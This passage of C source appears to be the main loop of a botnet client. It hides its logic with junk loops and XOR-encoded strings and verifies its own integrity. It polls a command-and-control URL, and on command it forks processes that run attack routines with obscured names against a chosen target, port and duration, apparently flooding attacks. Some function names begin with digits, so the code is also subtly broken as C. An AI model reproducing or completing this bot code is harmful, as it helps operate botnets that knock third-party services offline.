    unsigned char key[SHA256_DIGEST_LENGTH];
    unsigned long checksum3 = calculate_code_checksum((void *)main, CODE_SECTION_SIZE, 2);
    long max_latency = check_latency();
    generate_key(key, SHA256_DIGEST_LENGTH, checksum3, max_latency, 0);
    unsigned char derived_key = key[0];

    int dummy = 0;
    for (int i = 0; i < 500; i++) dummy ^= i * (i % 7);
    __asm__("nop; nop; nop;");

    char hash[HASH_LEN] = {0}, error[256] = {0};
    long file_size = 0;
    time_t timestamp = 0;
    if (!calculate_file_hash(argv[0], hash, &file_size, &timestamp, error)) {
        char msg[] = {0x11, 0x38, 0x22, 0x30, 0x22, 0x2e, 0x2b, 0x75, 0x31, 0x25, 0x2d, 0x29, 0x30, 0x7a, 0x7a, 0x7a, 0x5f, 0x55};
        xor_memory(msg, strlen(msg), derived_key);
        printf("%s", msg);
        return 1;
    }

    IntegrityResult result = verify_integrity(argv[0]);
    if (!result.success) {
        char msg[] = {0x11, 0x38, 0x22, 0x30, 0x22, 0x2e, 0x2b, 0x75, 0x31, 0x25, 0x2d, 0x29, 0x30, 0x7a, 0x7a, 0x7a, 0x5f, 0x55};
        xor_memory(msg, strlen(msg), derived_key);
        printf("%s", msg);
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);
    setup_signals();
    snprintf(bot_id, sizeof(bot_id), "bot-%d", rand() % 100);
    own_port = 8766 + (rand() % 10);
    fetch_user_agents();
    fetch_ip_geo(ip, sizeof(ip));

    struct lws_context_creation_info info = {0};
    info.port = own_port;
    info.protocols = (struct lws_protocols[]){
        {"bot-protocol", callback_websocket, 0, 0},
        {NULL, NULL, 0, 0}
    };
    info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
    struct lws_context *context = lws_create_context(&info);
    if (!context) {
        curl_global_cleanup();
        return 1;
    }

    pthread_t discovery_thread, command_thread;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&discovery_thread, &attr, multicast_discovery_thread, context) != 0 ||
        pthread_create(&command_thread, &attr, initiate_command_thread, context) != 0) {
        lws_context_destroy(context);
        curl_global_cleanup();
        pthread_attr_destroy(&attr);
        return 1;
    }
    pthread_attr_destroy(&attr);

    char command[32] = {0};
    char target[MAX_TARGET_LEN] = {0};
    int port = 0, duration = 0, connections = 0;
    int active_children = 0;
    if (check_config_file(command, target, &port, &duration, &connections)) {
        if (active_children < MAX_CHILDREN) {
            if (strcmp(command, "8sj3d") == 0 || strcmp(command, "u39rfood") == 0 || strcmp(command, "a06rtl69699") == 0) {
                if (port >= 1 && port <= 65535 && duration >= 1 && duration <= 3600) {
                    pid_t pid = fork();
                    if (pid == 0) {
                        if (strcmp(command, "8sj3d") == 0) {
                            8sj3d(target, port, duration);
                        } else if (strcmp(command, "u39rfood") == 0) {
                            u39rfood(target, port, duration);
                        } else {
                            a06rtl69699(target, port, duration);
                        }
                        exit(0);
                    }
                    if (pid > 0) active_children++;
                }
            } else if (strcmp(command, "1c3rtl23239") == 0) {
                if (duration >= 1 && duration <= 3600) {
                    pid_t pid = fork();
                    if (pid == 0) {
                        1c3rtl23239(target, duration);
                        exit(0);
                    }
                    if (pid > 0) active_children++;
                }
            } else if (strcmp(command, "6rtlee9") == 0) {
                if (connections >= 1 && connections <= MAX_THREADS && duration >= 1 && duration <= 3600) {
                    pid_t pid = fork();
                    if (pid == 0) {
                        6rtlee9(target, connections, duration);
                        exit(0);
                    }
                    if (pid > 0) active_children++;
                }
            } else if (strcmp(command, "e38s11") == 0) {
                e38s11(target);
            } else if (strcmp(command, "pl0c11f") == 0) {
                pl0c11f(target, command);
            }
        }
    }

    volatile sig_atomic_t running = 1;
    signal(SIGINT, signal_handler);
    while (running) {
        lws_service(context, 1000);
        while (waitpid(-1, NULL, WNOHANG) > 0) active_children--;
        char *json_data = fetch_data_from_url();
        if (json_data && parse_json(json_data, command, target, &port, &duration, &connections)) {
            if (active_children < MAX_CHILDREN) {
                if (strcmp(command, "8sj3d") == 0 || strcmp(command, "u39rfood") == 0 || strcmp(command, "a06rtl69699") == 0) {
                    if (port >= 1 && port <= 65535 && duration >= 1 && duration <= 3600) {
                        pid_t pid = fork();
                        if (pid == 0) {
                            if (strcmp(command, "8sj3d") == 0) {
                                8sj3d(target, port, duration);
                            } else if (strcmp(command, "u39rfood") == 0) {
                                u39rfood(target, port, duration);
                            } else {
                                a06rtl69699(target, port, duration);
                            }
                            exit(0);
                        }
                        if (pid > 0) active_children++;
                    }
                } else if (strcmp(command, "1c3rtl23239") == 0) {
                    if (duration >= 1 && duration <= 3600) {
                        pid_t pid = fork();
                        if (pid == 0) {
                            1c3rtl23239(target, duration);
                            exit(0);
                        }
                        if (pid > 0) active_children++;
                    }
                } else if (strcmp(command, "6rtlee9") == 0) {
                    if (connections >= 1 && connections <= MAX_THREADS && duration >= 1 && duration <= 3600) {
                        pid_t pid = fork();
                        if (pid == 0) {
                            6rtlee9(target, connections, duration);
                            exit(0);
                        }
                        if (pid > 0) active_children++;
                    }
                } else if (strcmp(command, "e38s11") == 0) {
                    e38s11(target);
                } else if (strcmp(command, "pl0c11f") == 0) {
                    pl0c11f(target, command);
                }
            }
        }
        free(json_data);
        sleep(C2_INTERVAL);
    }

    lws_context_destroy(context);
    curl_global_cleanup();
    return 0;
}
